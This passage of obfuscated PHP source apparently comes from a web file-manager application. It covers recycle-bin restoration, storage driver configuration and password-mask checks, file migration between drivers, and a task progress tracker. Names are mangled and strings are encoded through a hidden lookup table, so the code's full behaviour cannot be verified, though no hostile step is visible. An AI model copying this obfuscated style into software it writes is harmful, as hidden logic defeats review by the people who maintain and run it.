$this->where(array($à”ËÅ‹×[431] => $ù˜›Úçˆ))->delete(); $ò‚ôšà->folderSizeReset($¯Üæ‘°û[$à”ËÅ‹×[461]]); $‘ï’ß¤[] = $¯Üæ‘°û[$à”ËÅ‹×[461]]; if ($¯Üæ‘°û[$à”ËÅ‹×[439]] == $à”ËÅ‹×[88]) { $‘ï’ß¤[] = $ù˜›Úçˆ; } $ò‚ôšà->lockMoveEnd($ù˜›Úçˆ); } $ò‚ôšà->updateModifyTime($‘ï’ß¤); } private function restoreFolderChildren($™¯©Ü¨õ, $–ûš¹â‘) { $î• Œ·à =& $_SERVER[…É¦À–]; $Àå¤ËÓ‡ = Model($î• Œ·à[1378]); $„ÈĞ¬åö = array($î• Œ·à[431] => array($î• Œ·à[7], array())); foreach ($–ûš¹â‘ as $¢ú·Ÿ—à) { if ($¢ú·Ÿ—à == $™¯©Ü¨õ) { continue; } if (!$Àå¤ËÓ‡->isParentOf($™¯©Ü¨õ, $¢ú·Ÿ—à)) { continue; } $ø¿‹ë¡ì = $Àå¤ËÓ‡->sourceInfo($¢ú·Ÿ—à); if ($ø¿‹ë¡ì[$î• Œ·à[439]] == $î• Œ·à[88]) { $„ÈĞ¬åö[] = array($î• Œ·à[609] => array($î• Œ·à[569], $ø¿‹ë¡ì[$î• Œ·à[540]] . $¢ú·Ÿ—à . $î• Œ·à[570])); } else { $„ÈĞ¬åö[$î• Œ·à[431]][1][] = $¢ú·Ÿ—à; } } if (!$„ÈĞ¬åö[$î• Œ·à[431]][1]) { unset($„ÈĞ¬åö[$î• Œ·à[431]]); } if (!$„ÈĞ¬åö) { return; } $„ÈĞ¬åö[$î• Œ·à[431]][1] = array_unique($„ÈĞ¬åö[$î• Œ·à[431]][1]); $„ÈĞ¬åö[$î• Œ·à[1045]] = $î• Œ·à[1975]; $Àå¤ËÓ‡->where($„ÈĞ¬åö)->setField($î• Œ·à[460], 1); } private function recycleMove($ßëŸ³Ó, $©×Ş¨Ú¼ = 1) { $Ì”¬€¦ =& $_SERVER[…É¦À–]; $¡¾¹«Õ¨ = Model($Ì”¬€¦[1378]); $ÂÆÙªäá = Model($Ì”¬€¦[2191]); $ñş…Ê£ = array($Ì”¬€¦[431] => $ßëŸ³Ó); if ($©×Ş¨Ú¼) { $¡¾¹«Õ¨->where($ñş…Ê£)->setField($Ì”¬€¦[460], 1); $ÂÆÙªäá->eventRecycle($ßëŸ³Ó, $Ì”¬€¦[2192]); } else { $ú¦¼ŸÆ¦ = $¡¾¹«Õ¨->where($ñş…Ê£)->find(); $ªÅøïõ = $ú¦¼ŸÆ¦[$Ì”¬€¦[439]] == $Ì”¬€¦[88]; $…³Œ±Ÿ³ = $¡¾¹«Õ¨->fileNameAuto($ú¦¼ŸÆ¦[$Ì”¬€¦[461]], $ú¦¼ŸÆ¦[$Ì”¬€¦[32]], REPEAT_RENAME_FOLDER, $ªÅøïõ); if ($…³Œ±Ÿ³ != $ú¦¼ŸÆ¦[$Ì”¬€¦[32]]) { $¡¾¹«Õ¨->rename($ßëŸ³Ó, $…³Œ±Ÿ³); } $¡¾¹«Õ¨->where($ñş…Ê£)->setField($Ì”¬€¦[460], 0); $ÂÆÙªäá->eventRecycle($ßëŸ³Ó, $Ì”¬€¦[2193]); } } } class SourceSecretModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\145\155\x2e\163\157\165\162\x63\145\x53\x65\143\162\x65\164\x4c\x69\163\164"; public $field = array("\163\157\x75\162\x63\145\111\104", "\164\171\x70\145\x49\x44", "\143\162\x65\141\164\x65\125\163\x65\162"); } class StorageModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\145\155\56\x73\x74\x6f\162\x61\x67\x65\114\151\163\164"; public $field = array("\156\141\155\x65", "\163\x69\x7a\145\x4d\141\170", "\x73\171\x73\164\x65\155", "\144\x65\x66\141\x75\154\x74", "\144\x72\x69\x76\145\162", "\x63\157\x6e\146\151\x67"); public function listData($Ôü÷È = false, $Ğ’Ï¼Óû = "\x6d\157\144\x69\146\x79\x54\151\155\x65", $ë¥ò·Â— = false) { $Ñ– º =& $_SERVER[…É¦À–]; $¶â¨Ö‚Š = parent::listData($Ôü÷È, $Ğ’Ï¼Óû, $ë¥ò·Â—); if ($Ôü÷È) { return $¶â¨Ö‚Š; } $Èİìæš = $this->ioSizeUseGet(array_to_keyvalue($¶â¨Ö‚Š, $Ñ– º[12], $Ñ– º[428])); foreach ($¶â¨Ö‚Š as $úòĞ‡¬´ => $ò˜¬‘›è) { unset($¶â¨Ö‚Š[$úòĞ‡¬´][$Ñ– º[6]]); $¶â¨Ö‚Š[$úòĞ‡¬´][$Ñ– º[1866]] = isset($Èİìæš[$ò˜¬‘›è[$Ñ– º[428]]]) ? $Èİìæš[$ò˜¬‘›è[$Ñ– º[428]]] : 0; } return $¶â¨Ö‚Š; } public function ioSizeUseGet($Ñ®×†¾) { $§ø¥›·¹ =& $_SERVER[…É¦À–]; if (!$Ñ®×†¾) { return array(); } $£–«Ò = $§ø¥›·¹[2194] . implode($§ø¥›·¹[50], $Ñ®×†¾); $Ô¦¦ıéÈ = Cache::get($£–«Ò); if ($Ô¦¦ıéÈ) { return $Ô¦¦ıéÈ; } $™«ù’èë = array($§ø¥›·¹[857] => $§ø¥›·¹[428], $§ø¥›·¹[2195] => $§ø¥›·¹[76]); $ëÅùœ‘† = array($§ø¥›·¹[857] => array($§ø¥›·¹[7], $Ñ®×†¾)); $Ô¦¦ıéÈ = Model($§ø¥›·¹[829])->field($™«ù’èë)->where($ëÅùœ‘†)->group($§ø¥›·¹[857])->select(); $Ô¦¦ıéÈ = array_to_keyvalue($Ô¦¦ıéÈ, $§ø¥›·¹[428], $§ø¥›·¹[76]); Cache::set($£–«Ò, $Ô¦¦ıéÈ, 600); return $Ô¦¦ıéÈ; } public function getConfig($Ş¼ßÕô) { $ıÆğÒ®„ = parent::listData($Ş¼ßÕô); return json_decode($ıÆğÒ®„[$_SERVER[…É¦À–][6]], !0); } public function update($º¡á¿¨š, $¨ÓÍ×ø) { $ÅÄÇ“  =& $_SERVER[…É¦À–]; $—“é›…´ = $¨ÓÍ×ø[$ÅÄÇ“ [32]]; $ÏÁÂø– = array_to_keyvalue(parent::listData(), $ÅÄÇ“ [32]); if (isset($ÏÁÂø–[$—“é›…´]) && $ÏÁÂø–[$—“é›…´][$ÅÄÇ“ [428]] != $º¡á¿¨š) { return !1; } $this->checkPwd($º¡á¿¨š, $¨ÓÍ×ø); if (isset($¨ÓÍ×ø[$ÅÄÇ“ [2196]]) && $¨ÓÍ×ø[$ÅÄÇ“ [2196]] == $ÅÄÇ“ [88]) { $this->checkConfig($¨ÓÍ×ø); } unset($¨ÓÍ×ø[$ÅÄÇ“ [2196]]); $Éœßé„ò = parent::update($º¡á¿¨š, $¨ÓÍ×ø); if ($Éœßé„ò && $¨ÓÍ×ø[$ÅÄÇ“ [37]]) { $¦…¥¡‘ = 0; foreach ($ÏÁÂø– as $³Ö¾¤Û¢) { if ($³Ö¾¤Û¢[$ÅÄÇ“ [37]] && $³Ö¾¤Û¢[$ÅÄÇ“ [428]] != $º¡á¿¨š) { $¦…¥¡‘ = $³Ö¾¤Û¢[$ÅÄÇ“ [428]]; parent::update($³Ö¾¤Û¢[$ÅÄÇ“ [428]], array($ÅÄÇ“ [37] => 0)); } } $this->updateBackup($º¡á¿¨š, $¦…¥¡‘); } return $Éœßé„ò; } public function add($ÉıßÕ¨ƒ) { $ñø‹¶«Û =& $_SERVER[…É¦À–]; $–û ˜ÏÅ = array_to_keyvalue(parent::listData(), $ñø‹¶«Û[32]); if (isset($–û ˜ÏÅ[$ÉıßÕ¨ƒ[$ñø‹¶«Û[32]]])) { return !1; } $this->checkConfig($ÉıßÕ¨ƒ); $Ú”è× = parent::insert($ÉıßÕ¨ƒ); if ($Ú”è× && $ÉıßÕ¨ƒ[$ñø‹¶«Û[37]]) { foreach ($–û ˜ÏÅ as $³²´¶ —) { if ($³²´¶ —[$ñø‹¶«Û[37]]) { parent::update($³²´¶ —[$ñø‹¶«Û[428]], array($ñø‹¶«Û[37] => 0)); } } } return $Ú”è×; } public function updateBackup($ÉäÎÍã, $³–Âã‚) { $¤‚Õ± ’ =& $_SERVER[…É¦À–]; if (!$³–Âã‚) { return; } $¾Ôñ¾âÍ = Model($¤‚Õ± ’[789])->config(); if ($¾Ôñ¾âÍ[$¤‚Õ± ’[1657]] != $¤‚Õ± ’[88] || $¾Ôñ¾âÍ[$¤‚Õ± ’[791]] != $³–Âã‚) { return; } $ÂµˆĞÀ¡ = Model($¤‚Õ± ’[810])->get($¤‚Õ± ’[820]); $ÂµˆĞÀ¡ = json_decode($ÂµˆĞÀ¡, !0); if (!$ÂµˆĞÀ¡) { return; } $ÂµˆĞÀ¡[$¤‚Õ± ’[791]] = $ÉäÎÍã; Model($¤‚Õ± ’[810])->set(array($¤‚Õ± ’[820] => $ÂµˆĞÀ¡)); } public function checkPwd($ Ñ‹ïŒ, &$‰‚ Ûƒ) { $ùÊÕ¤ëŠ =& $_SERVER[…É¦À–]; if (empty($‰‚ Ûƒ[$ùÊÕ¤ëŠ[6]])) { return; } $‘ÌèÇ = json_decode($‰‚ Ûƒ[$ùÊÕ¤ëŠ[6]], !0); $âıë†ïÙ = $ùÊÕ¤ëŠ[12]; $‚Ä×âó = array($ùÊÕ¤ëŠ[2197], $ùÊÕ¤ëŠ[2198], $ùÊÕ¤ëŠ[934]); foreach ($‚Ä×âó as $¬ÓçØ±) { if (isset($‘ÌèÇ[$¬ÓçØ±])) { $âıë†ïÙ = $¬ÓçØ±; break; } } if (!$âıë†ïÙ) { return; } $ç©ÕšÓ™ = $this->getConfig($ Ñ‹ïŒ); $¤ßÛŞ† = $ç©ÕšÓ™[$âıë†ïÙ]; $ûùè¯Æ = $‘ÌèÇ[$âıë†ïÙ]; if ($ûùè¯Æ == str_repeat($ùÊÕ¤ëŠ[189], strlen($¤ßÛŞ†))) { $‘ÌèÇ[$âıë†ïÙ] = $¤ßÛŞ†; $‰‚ Ûƒ[$ùÊÕ¤ëŠ[6]] = json_encode($‘ÌèÇ); } else { if ($ûùè¯Æ != $¤ßÛŞ†) { $‰‚ Ûƒ[$ùÊÕ¤ëŠ[2196]] = $ùÊÕ¤ëŠ[88]; } } } public function checkConfig(&$Êú”à²°, $¢ù¥²Â = false) { $´™­Ê´ =& $_SERVER[…É¦À–]; $ÛÚ˜¨³ = strtolower($Êú”à²°[$´™­Ê´[95]]); $Øò¢¬Ü = json_decode($Êú”à²°[$´™­Ê´[6]], !0); foreach ($Øò¢¬Ü as $æö‡êïÜ => $²ôœØ’Ò) { $Øò¢¬Ü[$æö‡êïÜ] = trim($²ôœØ’Ò); } $Øò¢¬Ü[$´™­Ê´[2199]] = rand_string(6); $Ô„Ü ¹ş = $GLOBALS[$´™­Ê´[6]][$´™­Ê´[89]][$´™­Ê´[866]]; $ù½’›° = isset($Ô„Ü ¹ş[$ÛÚ˜¨³]) ? $Ô„Ü ¹ş[$ÛÚ˜¨³] : ucfirst($ÛÚ˜¨³); $ôÒÃÅƒ = $´™­Ê´[74] . $ù½’›°; if (!$ù½’›° || !class_exists($ôÒÃÅƒ)) { if ($¢ù¥²Â) { return LNG($´™­Ê´[2200]); } write_log(array($´™­Ê´[2201], $Êú”à²°, get_caller_info()), $´™­Ê´[2202]); show_json(LNG($´™­Ê´[2200]), !1, $Êú”à²°); } $¼Í®ªÖ² = new $ôÒÃÅƒ($Øò¢¬Ü); if (in_array($ÛÚ˜¨³, $¼Í®ªÖ²->objectDriver)) { if (!$¼Í®ªÖ²->isBucketCors() && !$¼Í®ªÖ²->setBucketCors()) { $²ÇĞ½‚ = LNG($´™­Ê´[2203]); $²ÇĞ½‚ .= $´™­Ê´[2204] . LNG($´™­Ê´[2205]); if ($¢ù¥²Â) { return $²ÇĞ½‚; } show_json($²ÇĞ½‚, !1); } } $Ä×İ€‡‰ = rtrim($Øò¢¬Ü[$´™­Ê´[1225]], $´™­Ê´[8]) . $´™­Ê´[8]; $ÊĞ¦ŸÄ = $¼Í®ªÖ²->getPath($Ä×İ€‡‰ . $´™­Ê´[1229]); if (!$¼Í®ªÖ²->mkfile($ÊĞ¦ŸÄ)) { if ($¢ù¥²Â) { return LNG($´™­Ê´[2203]); } show_json(LNG($´™­Ê´[2203]), !1); } $Øò¢¬Ü[$´™­Ê´[1225]] = $Ä×İ€‡‰; $Êú”à²°[$´™­Ê´[6]] = json_encode($Øò¢¬Ü); $Êú”à²°[$´™­Ê´[95]] = $ù½’›°; return !0; } public function driverListSystem() { $…Ïãèîâ =& $_SERVER[…É¦À–]; $Û±Â¡ë± = parent::listData(); $õ²ÅĞ»³ = array(); foreach ($Û±Â¡ë± as $•İ‚…´â) { unset($•İ‚…´â[$…Ïãèîâ[201]], $•İ‚…´â[$…Ïãèîâ[85]]); $•İ‚…´â[$…Ïãèîâ[6]] = json_decode($•İ‚…´â[$…Ïãèîâ[6]], !0); $õ²ÅĞ»³[] = $•İ‚…´â; } return $õ²ÅĞ»³; } public function defaultDriver() { $„Â“ú =& $_SERVER[…É¦À–]; $ÑŞ´•ŠÏ = parent::listData(); $Ü”®¸ÓŸ = array_filter_by_field($ÑŞ´•ŠÏ, $„Â“ú[37], 1); $Ü”®¸ÓŸ = $Ü”®¸ÓŸ[0]; if ($Ü”®¸ÓŸ) { $Ü”®¸ÓŸ[$„Â“ú[6]] = json_decode($Ü”®¸ÓŸ[$„Â“ú[6]], !0); } return $Ü”®¸ÓŸ; } public function driverInfo($û±îŒÔÃ) { $ç°™˜Ù‘ =& $_SERVER[…É¦À–]; $Ê•‡á‰µ = array_to_keyvalue(parent::listData(), $ç°™˜Ù‘[428]); if (!isset($Ê•‡á‰µ[$û±îŒÔÃ])) { return !1; } $…–‰ËÏ÷ = $Ê•‡á‰µ[$û±îŒÔÃ]; $…–‰ËÏ÷[$ç°™˜Ù‘[6]] = json_decode($…–‰ËÏ÷[$ç°™˜Ù‘[6]], !0); return $…–‰ËÏ÷; } public function remove($‰¤Ï×Õ) { $this->removeShareItems($‰¤Ï×Õ); return parent::remove($‰¤Ï×Õ); } public function removeWithFile($—ø´Õ¢‡, $ÄØÏ°Øì) { $“‰à‹ô´ =& $_SERVER[…É¦À–]; $µ™à²ı = array($“‰à‹ô´[857] => $—ø´Õ¢‡); $Ÿ°ôàîÏ = Model($“‰à‹ô´[500])->where($µ™à²ı)->count(); $€ô¨–ŠÇ = Model($“‰à‹ô´[500])->where($µ™à²ı)->sum($“‰à‹ô´[76]); $òÔ€Â”‰ = $ÄØÏ°Øì . $“‰à‹ô´[2206] . $—ø´Õ¢‡; $¯¥êà—Ä = LNG($ÄØÏ°Øì == $“‰à‹ô´[577] ? $“‰à‹ô´[2207] : $“‰à‹ô´[2208]); $•¾¤Ø½ = new TaskFileTransfer($òÔ€Â”‰, $“‰à‹ô´[2202], $Ÿ°ôàîÏ, $¯¥êà—Ä . "\x28{$—ø´Õ¢‡}\51"); $•¾¤Ø½->task[$“‰à‹ô´[803]] = (double) $€ô¨–ŠÇ; $õôüûÏò = KodIO::defaultDriver(); $ïõöèëî = $õôüûÏò[$“‰à‹ô´[428]]; $Ú€œ¸î× = "\173\x69\x6f\x3a{$ïõöèëî}\x7d\57"; $•‘•ÁÏ = !0; $²×• = array(); $¹Êñëàğ = Model($“‰à‹ô´[200])->where($µ™à²ı)->field($“‰à‹ô´[2209])->select(); foreach ($¹Êñëàğ as $ïæçúëÌ) { $×åÖÙ„¾ = $ïæçúëÌ[$“‰à‹ô´[84]]; $½‡¹«†² = $Ú€œ¸î× . str_replace("\x7b\x69\157\x3a{$—ø´Õ¢‡}\175\57", $“‰à‹ô´[12], $×åÖÙ„¾); if (!IO::exist($×åÖÙ„¾)) { $²×•[] = $ïæçúëÌ[$“‰à‹ô´[497]]; $•¾¤Ø½->updateFileEnd($ïæçúëÌ[$“‰à‹ô´[32]], $ïæçúëÌ[$“‰à‹ô´[76]]); continue; } if (IO::exist($½‡¹«†²)) { $•¾¤Ø½->updateFileEnd($ïæçúëÌ[$“‰à‹ô´[32]], $ïæçúëÌ[$“‰à‹ô´[76]]); continue; } if (!IO::move($×åÖÙ„¾, get_path_father($½‡¹«†²))) { $•‘•ÁÏ = !1; break; } $µ™à²ı = array($“‰à‹ô´[497] => $ïæçúëÌ[$“‰à‹ô´[497]]); $ØóÛø¯ü = array($“‰à‹ô´[857] => $ïõöèëî, $“‰à‹ô´[84] => $½‡¹«†²); Model($“‰à‹ô´[200])->where($µ™à²ı)->save($ØóÛø¯ü); } $this->removeByFileID($²×•); if (!$•‘•ÁÏ) { $•¾¤Ø½->stop($òÔ€Â”‰); return !1; } $•¾¤Ø½->end(); if ($ÄØÏ°Øì == $“‰à‹ô´[1846]) { $this->remove($—ø´Õ¢‡); } } public function progress($ÁäÜ„öÂ, $ÑÉ«™¯­) { return Task::get($ÑÉ«™¯­ . $_SERVER[…É¦À–][2206] . $ÁäÜ„öÂ); } private function removeByFileID($¢¶ÚŒİæ = array()) { $š¸èı À =& $_SERVER[…É¦À–]; if (empty($¢¶ÚŒİæ)) { return; } $­ÒÃ¾Üí = array($š¸èı À[497] => array($š¸èı À[7], $¢¶ÚŒİæ)); $¨Ñõ—§ó = Model($š¸èı À[1378])->where($­ÒÃ¾Üí)->field($š¸èı À[431])->select(); if (!$¨Ñõ—§ó) { return; } $¨Ñõ—§ó = array_to_keyvalue($¨Ñõ—§ó, $š¸èı À[12], $š¸èı À[431]); foreach ($¨Ñõ—§ó as $Ëû¼‘Ï) { Model($š¸èı À[445])->removeNow($Ëû¼‘Ï, !1); } } private function removeShareItems($¾©å±¡Ğ) { $Õô”ãÆ¾ =& $_SERVER[…É¦À–]; $Á®Î´•ı = "\x7b\x69\x6f\x3a{$¾©å±¡Ğ}\x7d\57"; $¨µ¤óĞ³ = array($Õô”ãÆ¾[431] => 0, $Õô”ãÆ¾[1220] => array($Õô”ãÆ¾[412], "{$Á®Î´•ı}\45")); $ÇÂÁßô = Model($Õô”ãÆ¾[1857])->where($¨µ¤óĞ³)->field($Õô”ãÆ¾[622])->select(); if (empty($ÇÂÁßô)) { return; } $ÈË¾Äœ¿ = array_to_keyvalue($ÇÂÁßô, $Õô”ãÆ¾[12], $Õô”ãÆ¾[622]); Model($Õô”ãÆ¾[621])->remove($ÈË¾Äœ¿); } } goto a©è®çˆ¶„; Cé­¼ÉÉäÄ: class Task { const STATYS_STOP = "\x73\x74\157\160"; const STATYS_RUNNING = "\x72\x75\156\x6e\151\156\x67"; const STATYS_KILL = "\x6b\151\154\154"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($Óú¼¸§ˆ, $€ü¨“™³ = '', $ºÜøñäŸ = 0, $‰ÌËóÚ = '') { $Ş§•áÉ =& $_SERVER[…É¦À–]; if (self::get($Óú¼¸§ˆ)) { return; } $this->task = array($Ş§•áÉ[428] => $Óú¼¸§ˆ, $Ş§•áÉ[1687] => USER_ID, $Ş§•áÉ[1584] => $‰ÌËóÚ, $Ş§•áÉ[482] => $Ş§•áÉ[12], $Ş§•áÉ[33] => $€ü¨“™³, $Ş§•áÉ[1109] => $Ş§•áÉ[12], $Ş§•áÉ[826] => $ºÜøñäŸ, $Ş§•áÉ[1688] => 0, $Ş§•áÉ[1689] => 0, $Ş§•áÉ[1690] => 0, $Ş§•áÉ[1691] => timeFloat(), $Ş§•áÉ[1692] => 0, $Ş§•áÉ[1693] => 0, $Ş§•áÉ[1694] => 0, $Ş§•áÉ[1695] => 0, $Ş§•áÉ[790] => $Ş§•áÉ[1646]); $GLOBALS[$Ş§•áÉ[1696]] = 1; Hook::bind($Ş§•áÉ[1651], array($this, $Ş§•áÉ[1697])); Hook::bind($Ş§•áÉ[1698], array($this, $Ş§•áÉ[1699])); $this->startAfter(); Hook::trigger($Ş§•áÉ[1700], $this->task); $this->task[$Ş§•áÉ[1693]] = timeFloat(); } public function end($ÌÚÇÓ× = '') { $­­”¢°ó =& $_SERVER[…É¦À–]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$­­”¢°ó[1693]]) { self::valueSet($this->task[$­­”¢°ó[428]], !1); } $this->isEnd = !0; if ($ÌÚÇÓ×) { $this->task[$­­”¢°ó[482]] = $ÌÚÇÓ×; } self::log($­­”¢°ó[1701] . $this->task[$­­”¢°ó[428]] . $­­”¢°ó[1702] . sprintf($­­”¢°ó[890], timeFloat() - $this->task[$­­”¢°ó[1691]]) . $­­”¢°ó[1703]); Hook::unbind($­­”¢°ó[1651], array($this, $­­”¢°ó[1697])); Hook::unbind($­­”¢°ó[1698], array($this, $­­”¢°ó[1699])); $this->endAfter(); $€ÀƒÇüÑ = $this->task; $this->task = !1; Hook::trigger($­­”¢°ó[1704], $€ÀƒÇüÑ); } public function update($•©Ü‹½ = 0, $÷Î§ûáÏ = false) { $íüŒ±Ö® =& $_SERVER[…É¦À–]; $É©ğ™€ =& $this->task; if (!$É©ğ™€) { return; } $É©ğ™€[$íüŒ±Ö®[1688]] += $•©Ü‹½; $É©ğ™€[$íüŒ±Ö®[1692]] = timeFloat(); if ($É©ğ™€[$íüŒ±Ö®[826]]) { if ($É©ğ™€[$íüŒ±Ö®[826]] < $É©ğ™€[$íüŒ±Ö®[1688]]) { $É©ğ™€[$íüŒ±Ö®[826]] = $É©ğ™€[$íüŒ±Ö®[1688]]; } $ÆÈâÓ´Ğ = timeFloat() - $É©ğ™€[$íüŒ±Ö®[1691]] - $É©ğ™€[$íüŒ±Ö®[1694]]; if ($ÆÈâÓ´Ğ <= 0) { $ÆÈâÓ´Ğ = 0.001; } $É©ğ™€[$íüŒ±Ö®[1689]] = $É©ğ™€[$íüŒ±Ö®[1688]] / $É©ğ™€[$íüŒ±Ö®[826]]; $É©ğ™€[$íüŒ±Ö®[1690]] = $É©ğ™€[$íüŒ±Ö®[1688]] / $ÆÈâÓ´Ğ; if ($É©ğ™€[$íüŒ±Ö®[1689]] > 0) { $É©ğ™€[$íüŒ±Ö®[1695]] = $ÆÈâÓ´Ğ * (1 - $É©ğ™€[$íüŒ±Ö®[1689]]) / $É©ğ™€[$íüŒ±Ö®[1689]]; } $É©ğ™€[$íüŒ±Ö®[1695]] = $É©ğ™€[$íüŒ±Ö®[1695]] <= 0 ? 0 : $É©ğ™€[$íüŒ±Ö®[1695]]; } $this->updateAfter(); $Î±ÂåŸì = 0.2; if (timeFloat() - $É©ğ™€[$íüŒ±Ö®[1693]] < $Î±ÂåŸì && !$÷Î§ûáÏ) { return; } $ô¶ƒå†Œ = self::get($É©ğ™€[$íüŒ±Ö®[428]]); $ê°¬©’ë = $ô¶ƒå†Œ[$íüŒ±Ö®[790]]; if ($ê°¬©’ë == self::STATYS_KILL) { $Ç»±ÓùÊ = array($íüŒ±Ö®[1705] => LNG($íüŒ±Ö®[1706]), $íüŒ±Ö®[1257] => !1); Cache::set($íüŒ±Ö®[1707] . $this->task[$íüŒ±Ö®[428]], $Ç»±ÓùÊ, 30); $this->onKill(); $this->end(); die; } else { if ($ê°¬©’ë == self::STATYS_STOP) { $Ææª†š® = 2; $ô¶ƒå†Œ[$íüŒ±Ö®[1694]] += $Ææª†š®; self::valueSet($É©ğ™€[$íüŒ±Ö®[428]], $ô¶ƒå†Œ); sleep($Ææª†š®); $this->update(); return; } } $É©ğ™€[$íüŒ±Ö®[790]] = $ê°¬©’ë ? $ê°¬©’ë : $É©ğ™€[$íüŒ±Ö®[790]]; $É©ğ™€[$íüŒ±Ö®[1694]] = $ô¶ƒå†Œ[$íüŒ±Ö®[1694]] ? $ô¶ƒå†Œ[$íüŒ±Ö®[1694]] : 0; $É©ğ™€[$íüŒ±Ö®[1693]] = timeFloat(); Hook::trigger($íüŒ±Ö®[1708], $É©ğ™€); self::valueSet($É©ğ™€[$íüŒ±Ö®[428]], $É©ğ™€); } public function onKillSet($û«£ïŒŞ, $ÀÇæ‘îé = array()) { $this->onKillCall = array($û«£ïŒŞ, $ÀÇæ‘îé); } public function onKill() { $úÌãâåğ =& $_SERVER[…É¦À–]; self::log($úÌãâåğ[1701] . $this->task[$úÌãâåğ[428]] . $úÌãâåğ[1709]); Hook::trigger($úÌãâåğ[1710], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($Ş‚Îâá¢) { $ÓŸ»†ï =& $_SERVER[…É¦À–]; Cache::set($ÓŸ»†ï[1707] . $this->task[$ÓŸ»†ï[428]], $Ş‚Îâá¢, 60); return $Ş‚Îâá¢; } public static function get($ÑØÏÍ•“) { $¦óŸ‡öÍ =& $_SERVER[…É¦À–]; $‘™ä÷Š® = self::valueGet($ÑØÏÍ•“); if (is_array($‘™ä÷Š®) && $‘™ä÷Š®[$¦óŸ‡öÍ[1711]]) { $§ôÍ¹ = ActionApply($‘™ä÷Š®[$¦óŸ‡öÍ[1711]], array($‘™ä÷Š®)); $‘™ä÷Š® = is_array($§ôÍ¹) ? $§ôÍ¹ : $‘™ä÷Š®; } return $‘™ä÷Š®; } public static function listData() { $§§Ç¶¹ó = self::valueGet(); return array_sort_by($§§Ç¶¹ó, $_SERVER[…É¦À–][1691], !0); } public static function kill($ ÉğÄğÑ) { return self::changeStatus($ ÉğÄğÑ, self::STATYS_KILL); } public static function stop($øº¶²ˆ) { return self::changeStatus($øº¶²ˆ, self::STATYS_STOP); } public static function restart($ƒƒÚğ¦€) { return self::changeStatus($ƒƒÚğ¦€, self::STATYS_RUNNING); } public static function killAll() { $âÂŞ× =& $_SERVER[…É¦À–]; $¬¼”ò¹ = self::listData(); foreach ($¬¼”ò¹ as $˜¾‰îà) { self::kill($˜¾‰îà[$âÂŞ×[428]]); } sleep(2); foreach ($¬¼”ò¹ as $˜¾‰îà) { self::valueSet($˜¾‰îà[$âÂŞ×[428]], !1); } } private static function changeStatus($™ãŒÍ®Å, $ªŞµ«¨…) { $“ƒ×•˜§ =& $_SERVER[…É¦À–]; $ä®ÈÁÔª = self::valueGet($™ãŒÍ®Å); if (!$ä®ÈÁÔª) { return !1; } $ä®ÈÁÔª[$“ƒ×•˜§[790]] = $ªŞµ«¨…; self::valueSet($™ãŒÍ®Å, $ä®ÈÁÔª); self::log($“ƒ×•˜§[1712] . $ä®ÈÁÔª[$“ƒ×•˜§[428]] . $“ƒ×•˜§[1713] . $ªŞµ«¨…); return !0; } public static function valueGet($Ğ©ç‚ÊŞ = false) { $¯Ô²€¿ı =& $_SERVER[…É¦À–]; if ($Ğ©ç‚ÊŞ) { $°³ø–Áø = Model($¯Ô²€¿ı[476])->where(array($¯Ô²€¿ı[94] => $Ğ©ç‚ÊŞ, $¯Ô²€¿ı[33] => $¯Ô²€¿ı[1116]))->find(); return $°³ø–Áø ? json_decode($°³ø–Áø[$¯Ô²€¿ı[403]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($ùÌç² = false) { $æıÚŞú· =& $_SERVER[…É¦À–]; $Àã¬‚´‘ = array($æıÚŞú·[33] => $æıÚŞú·[1116]); if ($ùÌç²) { $Àã¬‚´‘[$æıÚŞú·[1687]] = $ùÌç²; } $´ÌÔğ¹… = Model($æıÚŞú·[476])->where($Àã¬‚´‘)->select(); $´ÌÔğ¹… = $´ÌÔğ¹… ? $´ÌÔğ¹… : array(); foreach ($´ÌÔğ¹… as $©ÚŸÓ£¹ => $ÛÆ«Äó) { $´ÌÔğ¹…[$©ÚŸÓ£¹] = json_decode($ÛÆ«Äó[$æıÚŞú·[403]], !0); } return $´ÌÔğ¹…; } public static function valueSet($Ñ´èà²ğ, $Öúóæüö) { $¢±öÑÅ¥ =& $_SERVER[…É¦À–]; if (!$Öúóæüö) { return Model($¢±öÑÅ¥[476])->where(array($¢±öÑÅ¥[94] => $Ñ´èà²ğ, $¢±öÑÅ¥[33] => $¢±öÑÅ¥[1116]))->delete(); } $©—ï™Éí = json_encode($Öúóæüö); if (!$©—ï™Éí) { ob_start(); var_dump($Öúóæüö); $š³Õ³ = ob_get_clean(); self::log($¢±öÑÅ¥[1714] . json_encode_force($š³Õ³)); } if (!$Ñ´èà²ğ || !$Öúóæüö[$¢±öÑÅ¥[428]]) { return !1; } $¿ø›ÒÕÚ = array($¢±öÑÅ¥[33] => $¢±öÑÅ¥[1116], $¢±öÑÅ¥[1687] => USER_ID, $¢±öÑÅ¥[94] => $Ñ´èà²ğ, $¢±öÑÅ¥[403] => $©—ï™Éí); $©®òí = $¢±öÑÅ¥[1715]; CacheLock::lock($©®òí); Model($¢±öÑÅ¥[476])->add($¿ø›ÒÕÚ, array(), !0); CacheLock::unlock($©®òí); } public static function log($ÆÄ˜£—›) { if (!GLOBAL_DEBUG) { return; } write_log($ÆÄ˜£—›, $_SERVER[…É¦À–][1716]); } } class TaskFileTransfer extends Task { protected function startAfter() { $°ˆ÷½ÏÄ =& $_SERVER[…É¦À–]; $Ÿ“œ£õû =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($°ˆ÷½ÏÄ[1717], array($this, $°ˆ÷½ÏÄ[1718])); Hook::bind($°ˆ÷½ÏÄ[1268], array($this, $°ˆ÷½ÏÄ[1719])); Hook::bind($°ˆ÷½ÏÄ[1720], array($this, $°ˆ÷½ÏÄ[1721])); Hook::bind($°ˆ÷½ÏÄ[625], array($this, $°ˆ÷½ÏÄ[1722])); Hook::bind($°ˆ÷½ÏÄ[626], array($this, $°ˆ÷½ÏÄ[1723])); Hook::bind($°ˆ÷½ÏÄ[631], array($this, $°ˆ÷½ÏÄ[1724])); Hook::bind($°ˆ÷½ÏÄ[632], array($this, $°ˆ÷½ÏÄ[1725])); 